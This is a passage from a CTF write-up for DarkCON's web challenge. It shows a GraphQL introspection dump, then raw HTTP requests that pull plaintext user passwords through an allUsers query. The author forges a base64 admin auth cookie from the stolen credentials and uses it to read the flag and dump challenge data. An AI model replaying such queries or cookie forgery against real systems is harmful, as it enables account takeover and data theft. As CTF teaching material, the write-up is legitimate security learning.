          ""description"": ""A Directive provides a way to describe alternate runtime execution and type validation behavior in a GraphQL document.\n\nIn some cases, you need to provide options to alter GraphQL's execution behavior in ways field arguments will not suffice, such as conditionally including or skipping a field. Directives provide this by describing additional information to the executor."",
          ""fields"": [
            {
              ""name"": ""name"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""NON_NULL"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""SCALAR"",
                  ""name"": ""String"",
                  ""ofType"": null
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""description"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""isRepeatable"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""NON_NULL"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""SCALAR"",
                  ""name"": ""Boolean"",
                  ""ofType"": null
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""locations"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""NON_NULL"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""LIST"",
                  ""name"": null,
                  ""ofType"": {
                    ""kind"": ""NON_NULL"",
                    ""name"": null,
                    ""ofType"": {
                      ""kind"": ""ENUM"",
                      ""name"": ""__DirectiveLocation"",
                      ""ofType"": null
                    }
                  }
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""args"",
              ""description"": null,
              ""args"": [],
              ""type"": {
                ""kind"": ""NON_NULL"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""LIST"",
                  ""name"": null,
                  ""ofType"": {
                    ""kind"": ""NON_NULL"",
                    ""name"": null,
                    ""ofType"": {
                      ""kind"": ""OBJECT"",
                      ""name"": ""__InputValue"",
                      ""ofType"": null
                    }
                  }
                }
              },
              ""isDeprecated"": false,
              ""deprecationReason"": null
            }
          ],
          ""inputFields"": null,
          ""interfaces"": [],
          ""enumValues"": null,
          ""possibleTypes"": null
        },
        {
          ""kind"": ""ENUM"",
          ""name"": ""__DirectiveLocation"",
          ""description"": ""A Directive can be adjacent to many parts of the GraphQL language, a __DirectiveLocation describes one such possible adjacencies."",
          ""fields"": null,
          ""inputFields"": null,
          ""interfaces"": null,
          ""enumValues"": [
            {
              ""name"": ""QUERY"",
              ""description"": ""Location adjacent to a query operation."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""MUTATION"",
              ""description"": ""Location adjacent to a mutation operation."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""SUBSCRIPTION"",
              ""description"": ""Location adjacent to a subscription operation."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""FIELD"",
              ""description"": ""Location adjacent to a field."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""FRAGMENT_DEFINITION"",
              ""description"": ""Location adjacent to a fragment definition."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""FRAGMENT_SPREAD"",
              ""description"": ""Location adjacent to a fragment spread."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""INLINE_FRAGMENT"",
              ""description"": ""Location adjacent to an inline fragment."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""VARIABLE_DEFINITION"",
              ""description"": ""Location adjacent to a variable definition."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""SCHEMA"",
              ""description"": ""Location adjacent to a schema definition."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""SCALAR"",
              ""description"": ""Location adjacent to a scalar definition."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""OBJECT"",
              ""description"": ""Location adjacent to an object type definition."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""FIELD_DEFINITION"",
              ""description"": ""Location adjacent to a field definition."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""ARGUMENT_DEFINITION"",
              ""description"": ""Location adjacent to an argument definition."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""INTERFACE"",
              ""description"": ""Location adjacent to an interface definition."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""UNION"",
              ""description"": ""Location adjacent to a union definition."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""ENUM"",
              ""description"": ""Location adjacent to an enum definition."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""ENUM_VALUE"",
              ""description"": ""Location adjacent to an enum value definition."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""INPUT_OBJECT"",
              ""description"": ""Location adjacent to an input object type definition."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            },
            {
              ""name"": ""INPUT_FIELD_DEFINITION"",
              ""description"": ""Location adjacent to an input object field definition."",
              ""isDeprecated"": false,
              ""deprecationReason"": null
            }
          ],
          ""possibleTypes"": null
        }
      ],
      ""directives"": [
        {
          ""name"": ""include"",
          ""description"": ""Directs the executor to include this field or fragment only when the `if` argument is true."",
          ""locations"": [
            ""FIELD"",
            ""FRAGMENT_SPREAD"",
            ""INLINE_FRAGMENT""
          ],
          ""args"": [
            {
              ""name"": ""if"",
              ""description"": ""Included when true."",
              ""type"": {
                ""kind"": ""NON_NULL"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""SCALAR"",
                  ""name"": ""Boolean"",
                  ""ofType"": null
                }
              },
              ""defaultValue"": null
            }
          ]
        },
        {
          ""name"": ""skip"",
          ""description"": ""Directs the executor to skip this field or fragment when the `if` argument is true."",
          ""locations"": [
            ""FIELD"",
            ""FRAGMENT_SPREAD"",
            ""INLINE_FRAGMENT""
          ],
          ""args"": [
            {
              ""name"": ""if"",
              ""description"": ""Skipped when true."",
              ""type"": {
                ""kind"": ""NON_NULL"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""SCALAR"",
                  ""name"": ""Boolean"",
                  ""ofType"": null
                }
              },
              ""defaultValue"": null
            }
          ]
        },
        {
          ""name"": ""deprecated"",
          ""description"": ""Marks an element of a GraphQL schema as no longer supported."",
          ""locations"": [
            ""FIELD_DEFINITION"",
            ""ARGUMENT_DEFINITION"",
            ""INPUT_FIELD_DEFINITION"",
            ""ENUM_VALUE""
          ],
          ""args"": [
            {
              ""name"": ""reason"",
              ""description"": ""Explains why this element was deprecated, usually also including a suggestion for how to access supported similar data. Formatted using the Markdown syntax, as specified by [CommonMark](https://commonmark.org/)."",
              ""type"": {
                ""kind"": ""SCALAR"",
                ""name"": ""String"",
                ""ofType"": null
              },
              ""defaultValue"": ""\""No longer supported\""""
            }
          ]
        },
        {
          ""name"": ""specifiedBy"",
          ""description"": ""Exposes a URL that specifies the behaviour of this scalar."",
          ""locations"": [
            ""SCALAR""
          ],
          ""args"": [
            {
              ""name"": ""url"",
              ""description"": ""The URL that specifies the behaviour of this scalar."",
              ""type"": {
                ""kind"": ""NON_NULL"",
                ""name"": null,
                ""ofType"": {
                  ""kind"": ""SCALAR"",
                  ""name"": ""String"",
                  ""ofType"": null
                }
              },
              ""defaultValue"": null
            }
          ]
        }
      ]
    }
  }
}
```

With [this site](https://apis.guru/graphql-voyager/) you can easily view the schema structure.

![schema.png](schema.png)

The ID of the challenge that should have the flag is `35`. You can try to retrieve the flag, but you will discover that you are not authorized.

```
POST /graphql HTTP/1.1
Host: darkcon-challs.darkarmy.xyz
Content-Length: 81
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://darkcon-challs.darkarmy.xyz
Referer: http://darkcon-challs.darkarmy.xyz/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: __cfduid=debb56df9ac3af6ddd05cb65280ecf14c1613856793; auth=Z3Vlc3Q6a2FybWE5ODc0
Connection: close

query=query Query { flag(chall_id: ""35"") { chall_id chall_title chall_flag } }

HTTP/1.1 200 OK
Date: Sun, 21 Feb 2021 09:05:58 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 24
Connection: close
X-Powered-By: Express
ETag: W/""18-jNjk7rdLlrZtB7gMvaPvqbKrjSU""
CF-Cache-Status: DYNAMIC
cf-request-id: 08656fb6f50000fa3436bff000000001
Report-To: {""group"":""cf-nel"",""max_age"":604800,""endpoints"":[{""url"":""https:\/\/a.nel.cloudflare.com\/report?s=yCWsVBVZPyaPg1dhWiD6IbgQjewru%2BKL%2FjCvzjAReoUk4nRNNo5bUvaKPqKBbSyYP0Z7%2BvYSwoubmbDMMxpknUA581ohThnEG5YjsAMJo%2F9JOlo5w%2BlW6E8qDEg%3D""}]}
NEL: {""max_age"":604800,""report_to"":""cf-nel""}
Server: cloudflare
CF-RAY: 624f4f04b895fa34-AMS

{
  ""Err"": ""Not Authorized""
}
```

There is a query, `allUsers`, that can be used to retrieve users data.

```
POST /graphql HTTP/1.1
Host: darkcon-challs.darkarmy.xyz
Content-Length: 55
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://darkcon-challs.darkarmy.xyz
Referer: http://darkcon-challs.darkarmy.xyz/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: __cfduid=debb56df9ac3af6ddd05cb65280ecf14c1613856793; auth=Z3Vlc3Q6a2FybWE5ODc0
Connection: close

query=query Query { allUsers { id username password } }

HTTP/1.1 200 OK
Date: Sun, 21 Feb 2021 09:08:31 GMT
Content-Type: application/json; charset=utf-8
Connection: close
X-Powered-By: Express
ETag: W/""8f-3/OTKFdCDtZCHqY8nFfRgKUK4QI""
CF-Cache-Status: DYNAMIC
cf-request-id: 0865720b290000c79134bfe000000001
Report-To: {""endpoints"":[{""url"":""https:\/\/a.nel.cloudflare.com\/report?s=hrY%2FNJrx%2F%2FoROpcQ4g%2BhosyvUuio0BtjnUfBtdD%2BLtaxObdFNfwfxKpxc482AAjMy5CiEc3gBt37Xi9PjASMs%2Fb7qoX0sd5SPdzIpRLnvQUzvU7NaWGDMq3vGLU%3D""}],""group"":""cf-nel"",""max_age"":604800}
NEL: {""max_age"":604800,""report_to"":""cf-nel""}
Server: cloudflare
CF-RAY: 624f52bead3cc791-AMS
Content-Length: 143

{
  ""data"": {
    ""allUsers"": [
      {
        ""id"": ""1"",
        ""username"": ""guest"",
        ""password"": ""karma9874""
      },
      {
        ""id"": ""2"",
        ""username"": ""admin"",
        ""password"": ""is_this_visible_to_you?""
      }
    ]
  }
}
```

So you can craft the authentication cookie for the administrator.

```
admin:is_this_visible_to_you?

YWRtaW46aXNfdGhpc192aXNpYmxlX3RvX3lvdT8
```

And then retrieve the data for the challenge.

```
POST /graphql HTTP/1.1
Host: darkcon-challs.darkarmy.xyz
Content-Length: 81
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://darkcon-challs.darkarmy.xyz
Referer: http://darkcon-challs.darkarmy.xyz/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: __cfduid=debb56df9ac3af6ddd05cb65280ecf14c1613856793; auth=YWRtaW46aXNfdGhpc192aXNpYmxlX3RvX3lvdT8
Connection: close

query=query Query { flag ( chall_id: ""35"" ) { chall_id chall_title chall_flag } }

HTTP/1.1 200 OK
Date: Sun, 21 Feb 2021 09:13:58 GMT
Content-Type: application/json; charset=utf-8
Connection: close
X-Powered-By: Express
ETag: W/""5c-FgbC+3HIALyZvUNnISTqvCAIlgA""
CF-Cache-Status: DYNAMIC
cf-request-id: 086577087500004c2c159c4000000001
Report-To: {""endpoints"":[{""url"":""https:\/\/a.nel.cloudflare.com\/report?s=6h11qMw3Y546CXaKDdJSZe%2FOmVxxY1%2Fm3cTVwaCJUuXgedZM8chxABojF6e1cClTueTwq1%2BmLVvdPfLZEZ%2Bb78nHOTGcBJ%2FUkV%2FfiOeVtrmF4WceuxTLwtsHqaQ%3D""}],""max_age"":604800,""group"":""cf-nel""}
NEL: {""max_age"":604800,""report_to"":""cf-nel""}
Server: cloudflare
CF-RAY: 624f5aba589a4c2c-AMS
Content-Length: 92

{
  ""data"": {
    ""flag"": {
      ""chall_id"": ""35"",
      ""chall_title"": ""DarkCON Challs"",
      ""chall_flag"": ""<REDACTED>""
    }
  }
}
```

You can read hint data too.

```
POST /graphql HTTP/1.1
Host: darkcon-challs.darkarmy.xyz
Content-Length: 80
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://darkcon-challs.darkarmy.xyz
Referer: http://darkcon-challs.darkarmy.xyz/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: __cfduid=debb56df9ac3af6ddd05cb65280ecf14c1613856793; auth=YWRtaW46aXNfdGhpc192aXNpYmxlX3RvX3lvdT8
Connection: close

query=query Query { hint ( chall_id: ""35"" ) { chall_id chall_title take_hint } }

HTTP/1.1 200 OK
Date: Sun, 21 Feb 2021 09:21:11 GMT
Content-Type: application/json; charset=utf-8
Connection: close
X-Powered-By: Express
ETag: W/""5f-kGQLeohKMlOd7rZnywCxmrcAeaw""
CF-Cache-Status: DYNAMIC
cf-request-id: 08657da46500001ecec2891000000001
Report-To: {""endpoints"":[{""url"":""https:\/\/a.nel.cloudflare.com\/report?s=jKrMx7IUq0mRbVR8BH2xQxXSUOMX4oiWU9Ked9k9BOLre3%2Bo5xvakSY7uVPlK%2BpQW2wMotsfDoYDfDTm9IGLUXIDp7N0LGT54vNR9ZtpfH8qnmhRQVQQOcrkR8g%3D""}],""group"":""cf-nel"",""max_age"":604800}
NEL: {""max_age"":604800,""report_to"":""cf-nel""}
Server: cloudflare
CF-RAY: 624f654d6d691ece-AMS
Content-Length: 95

{
  ""data"": {
    ""hint"": {
      ""chall_id"": ""35"",
      ""chall_title"": ""DarkCON Challs"",
      ""take_hint"": ""want_hint? @_@""
    }
  }
}
```

You can dump all challenges data, but there is no flag at all.

```
POST /graphql HTTP/1.1
Host: darkcon-challs.darkarmy.xyz
Content-Length: 117
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://darkcon-challs.darkarmy.xyz
Referer: http://darkcon-challs.darkarmy.xyz/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: __cfduid=debb56df9ac3af6ddd05cb65280ecf14c1613856793; auth=YWRtaW46aXNfdGhpc192aXNpYmxlX3RvX3lvdT8
Connection: close

query=query Query { Challs { id title description category author points flag { chall_id chall_title chall_flag } } }

HTTP/1.1 200 OK
Date: Sun, 21 Feb 2021 09:29:48 GMT
Content-Type: application/json; charset=utf-8
Connection: close
X-Powered-By: Express
ETag: W/""2a32-2n12reS6ATDeNILvzTr5/2ptQz4""
CF-Cache-Status: DYNAMIC
cf-request-id: 08658588b700001fea52990000000001
Report-To: {""group"":""cf-nel"",""endpoints"":[{""url"":""https:\/\/a.nel.cloudflare.com\/report?s=XwVT9kHvg7bADUmTe2OVwHeWOmQOuK9QDgbCGlEvlYKrKQ6UW%2BZm57PXIKA%2BDP%2BZP%2Bg8rGqbGyUxa6eUXeIruJFB6ymFQADK%2BKUx%2FxBvr6tady3%2F7DiNDG%2BTb0I%3D""}],""max_age"":604800}
NEL: {""report_to"":""cf-nel"",""max_age"":604800}
Server: cloudflare
CF-RAY: 624f71edf9b51fea-AMS
Content-Length: 10802

{
  ""data"": {
    ""Challs"": [
      {
        ""id"": ""1"",
        ""title"": ""Read"",
        ""description"": ""Reading is the best way to solve a challenge"",
        ""category"": ""Rev"",
        ""author"": ""1GN1tE"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""1"",
          ""chall_title"": ""Read"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""2"",
        ""title"": ""(Not) Easy"",
        ""description"": ""You know what to do... More info inside :wink:\r\n"",
        ""category"": ""Rev"",
        ""author"": ""1GN1tE"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""2"",
          ""chall_title"": ""(Not) Easy"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""3"",
        ""title"": ""ezpz"",
        ""description"": ""Some easy android for ya :)"",
        ""category"": ""Rev"",
        ""author"": ""karma"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""3"",
          ""chall_title"": ""ezpz"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""4"",
        ""title"": ""Pixelify"",
        ""description"": ""Pixels don't reveal secrets, or do they?"",
        ""category"": ""Misc"",
        ""author"": ""1GN1tE, RDxR10"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""4"",
          ""chall_title"": ""Pixelify"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""5"",
        ""title"": ""Camouflage"",
        ""description"": ""General: We've got the hideouts. From here on out, hear out!\r\nYou: Roger! "",
        ""category"": ""Misc"",
        ""author"": ""RDxR10"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""5"",
          ""chall_title"": ""Camouflage"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""6"",
        ""title"": ""Take It Easy"",
        ""description"": ""None"",
        ""category"": ""Crypto"",
        ""author"": ""ArM4d4"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""6"",
          ""chall_title"": ""Take It Easy"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""7"",
        ""title"": ""MITM"",
        ""description"": ""Bob Wants the secret code from the alice . After getting the secret code from alice, bob sends his secret code to alice. Can you find the secret codes of alice and bob?"",
        ""category"": ""Crypto"",
        ""author"": ""manish"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""7"",
          ""chall_title"": ""MITM"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""8"",
        ""title"": ""Tony And James"",
        ""description"": ""Attachments"",
        ""category"": ""Crypto"",
        ""author"": ""r3yc0n1c"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""8"",
          ""chall_title"": ""Tony And James"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""9"",
        ""title"": ""Disguised Wordlets"",
        ""description"": ""Order amidst the chaos, that's what you need to seek.\r\n\r\nNOTE : separate the words in the flag by underscores (lowercase)\r\nFormat : darkCON{flag}"",
        ""category"": ""Crypto"",
        ""author"": ""RDxR10"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""9"",
          ""chall_title"": ""Disguised Wordlets"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""10"",
        ""title"": ""Easy-ROP"",
        ""description"": ""Welcome to the world of pwn!!! This should be a good entry level warmup challenge !!"",
        ""category"": ""Pwn"",
        ""author"": ""manish"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""10"",
          ""chall_title"": ""Easy-ROP"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""11"",
        ""title"": ""warmup"",
        ""description"": ""warm up yourself and get a shell!"",
        ""category"": ""Pwn"",
        ""author"": ""Bitfriends"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""11"",
          ""chall_title"": ""warmup"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""12"",
        ""title"": ""Meme_Stash"",
        ""description"": ""White Wolf cloned this website for some memes while browsing some memes he stumbled upon the flag but now he is not able to find it can you help him"",
        ""category"": ""Web"",
        ""author"": ""Karma"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""12"",
          ""chall_title"": ""Meme_Stash"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""13"",
        ""title"": ""WTF PHP"",
        ""description"": ""Your php function didnt work? maybe some info will help you xD Note: flag is in /etc"",
        ""category"": ""Web"",
        ""author"": ""Karma"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""13"",
          ""chall_title"": ""WTF PHP"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""14"",
        ""title"": ""Easy PHP"",
        ""description"": ""Please note...."",
        ""category"": ""Web"",
        ""author"": ""Rosee"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""14"",
          ""chall_title"": ""Easy PHP"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""15"",
        ""title"": ""The Reporter"",
        ""description"": ""Miss Lola beck has something on her social media account. You are Agent P. find the secret."",
        ""category"": ""Osint"",
        ""author"": ""trish56"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""15"",
          ""chall_title"": ""The Reporter"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""16"",
        ""title"": ""Travel to the home"",
        ""description"": ""I Travelled from MAS to CBE at 10 Jan 2020 (Any direction) and i took a beautiful picture while travelling\r\nFind the Exact location (co-ordinates upto 3 decimal point) and approximate time while i took the pick\r\nFlag format will be {lat,long,time} for time it is 1 hour duration like (01-02)"",
        ""category"": ""Osint"",
        ""author"": ""Kick"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""16"",
          ""chall_title"": ""Travel to the home"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""17"",
        ""title"": ""Scattered Pieces"",
        ""description"": ""Some suspicious stuff going on the network can you figure it out ?"",
        ""category"": ""Forensics"",
        ""author"": ""White_Wolf"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""17"",
          ""chall_title"": ""Scattered Pieces"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""18"",
        ""title"": ""Do you know them?"",
        ""description"": ""\""Answer These Quesions: 1. last folder modified 2. last keyword searched 3. last link entered Flag format: darkCON{last folder modified_last keyword searched_last link entered}\r\n\"""",
        ""category"": ""Forensics"",
        ""author"": ""White_Wolf"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""18"",
          ""chall_title"": ""Do you know them?"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""19"",
        ""title"": ""CyberDark_0x01: ShitComp"",
        ""description"": ""\""Goldhand:    Hey I want to play the new game `CyberDark`, it's so cool. But I have a problem... I want you to hack the game installer.\r\n\r\nV:            Here to staisfy ur needs\r\n\r\nGoldhand:    Ok I am giving you the Installer after changing it with my own compressor `ShitComp`... Crack the Installe"",
        ""category"": ""Rev"",
        ""author"": ""1GN1tE"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""19"",
          ""chall_title"": ""CyberDark_0x01: ShitComp"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""20"",
        ""title"": ""CyberDark_0x02: Installer"",
        ""description"": ""\""Goldhand:    So you have proven you worth.\r\n\r\nV:            Told Ya\r\n\r\nGoldHand:     Now send me the keys... nc <host> <port>\"""",
        ""category"": ""Rev"",
        ""author"": ""1GN1tE"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""20"",
          ""chall_title"": ""CyberDark_0x02: Installer"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""21"",
        ""title"": ""TOO_MUCH"",
        ""description"": ""How about reversing 200 functions at once?? Try yourself!!!"",
        ""category"": ""Rev"",
        ""author"": ""Manish"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""21"",
          ""chall_title"": ""TOO_MUCH"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""22"",
        ""title"": ""Web + Crypto"",
        ""description"": ""Made this website where you can read files Note: Flag at /etc/flag.txt"",
        ""category"": ""Misc"",
        ""author"": ""karma"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""22"",
          ""chall_title"": ""Web + Crypto"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""23"",
        ""title"": ""PokePark - Raising New Generat"",
        ""description"": ""nc Connection "",
        ""category"": ""Crypto"",
        ""author"": ""r3yc0n1c"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""23"",
          ""chall_title"": ""PokePark - Raising New Generat"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""24"",
        ""title"": ""Rookie's_Choice_4_you"",
        ""description"": ""Attachments"",
        ""category"": ""Crypto"",
        ""author"": ""r3yc0n1c"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""24"",
          ""chall_title"": ""Rookies_Choice_4_you"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""25"",
        ""title"": ""NO-Output"",
        ""description"": ""\""Ok !!! This challenge doesn't give any output. Now try to get the shell.\r\n\r\nThe libc has tcache enabled and you don't require libc for this challenge at all. This challenge can be done without having libc. You don't need to guess or bruteforce libc.\"""",
        ""category"": ""Pwn"",
        ""author"": ""manish"",
        ""points"": 0,
        ""flag"": {
          ""chall_id"": ""25"",
          ""chall_title"": ""NO-Output"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""26"",
        ""title"": ""FS-2"",
        ""description"": ""I patched all the vulnerabilities. Now you can't exploit my service."",
        ""category"": ""Pwn"",
        ""author"": ""manish"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""26"",
          ""chall_title"": ""FS-2"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""27"",
        ""title"": ""wrong location"",
        ""description"": ""I think I am at the wrong location. We need to get home, to root !"",
        ""category"": ""Pwn"",
        ""author"": ""Bitfriends"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""27"",
          ""chall_title"": ""wrong location"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""28"",
        ""title"": ""Capture the Meme"",
        ""description"": ""Made this meme generator for ya :) hope you like some memes Note: Flag at /etc/flag.txt"",
        ""category"": ""Web"",
        ""author"": ""Karma"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""28"",
          ""chall_title"": ""Capture the Meme"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""30"",
        ""title"": ""Find her Boyfriend"",
        ""description"": ""\""You know Lola, right? She met her boyfriend few days ago and after that he just vanished. She tried to contact him by every means but failed. The last thing she remembers is her bf texting someone.\r\nSubmit the flag in flag format.\"""",
        ""category"": ""Osint"",
        ""author"": ""trish56"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""30"",
          ""chall_title"": ""Find her Boyfriend"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""31"",
        ""title"": ""Mr.Wolf Darkest Secret"",
        ""description"": ""Can you find Mr.Wolf's Darkest Secret he was trying to access some other system and wants to hide something from everyone"",
        ""category"": ""Forensics"",
        ""author"": ""White_Wolf"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""31"",
          ""chall_title"": ""Mr.Wolf Darkest Secret"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""32"",
        ""title"": ""Fire in the androidddddddd"",
        ""description"": ""To decrypt something we need encrypted stuff"",
        ""category"": ""Rev"",
        ""author"": ""Karma"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""32"",
          ""chall_title"": ""Fire in the androidddddddd"",
          ""chall_flag"": ""darkCON{fake_flag}""
        }
      },
      {
        ""id"": ""33"",
        ""title"": ""Risk Security Analyst Alice Vs"",
        ""description"": ""\""La Casa De Tuple (L.C.D.T) is a Company in Spain which provides their \r\nown End-to-end encryption services and Alice got a job there. It was \r\nher first day and her boss told her to manage the **secrets** and \r\nencrypt the user data with their new End-to-end encryption system. \r\nYou are Eve and you"",
        ""category"": ""Crypto"",
        ""author"": ""r3yc0n1c"",
        ""points"": 500,
        ""flag"": {
          ""chall_id"": ""33"",
          ""chall_title"": ""Risk Security Analyst Alice Vs"",
